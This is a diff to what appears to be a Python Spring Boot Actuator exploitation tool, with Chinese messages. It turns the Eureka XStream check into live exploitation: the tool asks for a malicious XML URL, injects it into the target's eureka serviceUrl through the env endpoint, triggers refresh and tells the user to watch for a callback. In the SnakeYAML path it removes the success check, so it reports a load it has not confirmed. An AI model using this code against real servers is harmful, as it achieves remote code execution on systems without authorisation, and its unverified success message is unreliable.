@@ -387,10 +387,7 @@ def SnakeYAML_RCE(url, proxies, header_new):
             re1 = requests.post(url=url_1, headers=Headers_1, timeout=outtime, data=payload_1, allow_redirects=False,
                                 verify=False, proxies=proxies)
             requests.post(url=url_refresh_1, headers=Headers_1, timeout=outtime, allow_redirects=False,)
-            if ('example.yml' in str(re1.text)):
-                cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
-            else:
-                cprint("[-] 恶意yaml加载失败，请检查URL是否正确\n", "yellow")
+            cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
 
         elif ('example.yml' in str(re2.text)):
             cprint("[+] 发现SnakeYAML-RCE漏洞，版本为Spring 2.x", "red")
@@ -400,10 +397,7 @@ def SnakeYAML_RCE(url, proxies, header_new):
             re2 = requests.post(url=url_2, headers=Headers_2, timeout=outtime, data=payload_2, allow_redirects=False,
                                 verify=False, proxies=proxies)
             requests.post(url=url_refresh_2, headers=Headers_2, timeout=outtime, allow_redirects=False,)
-            if ('example.yml' in str(re2.text)):
-                cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
-            else:
-                cprint("[-] 恶意yaml加载失败，请检查URL是否正确\n", "yellow")
+            cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
         else:
             cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
 
@@ -432,20 +426,36 @@ def Eureka_xstream_RCE(url, proxies, header_new):
     payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
     path1 = 'env'
     path2 = 'actuator/env'
+    url_refresh_1 = url + 'refresh'
+    url_refresh_2 = url + 'actuator/refresh'
     try:
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
         re1 = requests.post(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
         re2 = requests.post(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+
         if ('127.0.0.2' in str(re1.text)):
-            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 1.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
+            cprint("[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring 1.x", "red")
+            EvilUrl = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ")
+            EvilUrl = EvilUrl.strip()
+            payload_1 = "eureka.client.serviceUrl.defaultZone=" + EvilUrl
+            re1 = requests.post(url=urltest1, headers=Headers_1, timeout=outtime, data=payload_1, allow_redirects=False,
+                                verify=False, proxies=proxies)
+            requests.post(url=url_refresh_1, timeout=outtime, allow_redirects=False, verify=False, proxies=proxies)
+            cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
+
+
         elif ('127.0.0.2' in str(re2.text)):
-            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 2.x：", "red")
-            cprint('漏洞存在路径为 ' + urltest2 + '\n', "red")
-            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
+            cprint("[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring 2.x", "red")
+            EvilUrl = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ")
+            EvilUrl = EvilUrl.strip()
+            payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"" + EvilUrl + "\"}"
+            re2 = requests.post(url=urltest2, headers=Headers_2, timeout=outtime, data=payload_2, allow_redirects=False,
+                                verify=False, proxies=proxies)
+            requests.post(url=url_refresh_2, timeout=outtime, allow_redirects=False, verify=False, proxies=proxies)
+            cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
+
         else:
             cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
     except KeyboardInterrupt:
